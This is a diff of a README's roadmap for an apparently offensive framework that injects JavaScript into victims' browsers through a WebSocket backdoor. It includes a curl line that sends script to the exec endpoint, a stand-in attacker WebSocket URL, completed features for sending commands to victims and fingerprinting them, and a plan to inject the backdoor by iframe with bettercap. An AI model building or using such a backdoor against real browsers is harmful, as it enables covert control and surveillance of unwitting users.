@@ -27,10 +27,11 @@ A framework for exploiting browsers by injecting Javascript to a web-based backd
 <pre>curl 'http://localhost:1337/exec?alert("muahahahaha")'</pre>
 
 # TODO & Roadmap
-- For testing, if the servers root is requested, return the backdoor.html file
+- (DONE) For testing, if the servers root is requested, return the backdoor.html file
 - backdoor must be built to only provide the URL to connect to if it was not already set. so that the url can be changed by adding an extra script-segment with "var socket = new WebSocket('ws://wereiwanttogo.com:1337')"
-- interface should take commands to be sent to victims.
-- a new connection should be fingerprinted and logged to a local file
+- (DONE) interface should take commands to be sent to victims.
+- (DONE) a new connection should be fingerprinted 
+- ... and merged with the connection object and also logged to a local file with a history of commands.
 - interface with more layers to list and send commands specific to victim
 - GET call to server (from local) to generate payload (newest version) with specified URL to be directed to
 - Help command in interface should explain how iframe can be use for the injection of backdoor.html by tool like bettercap (for example)
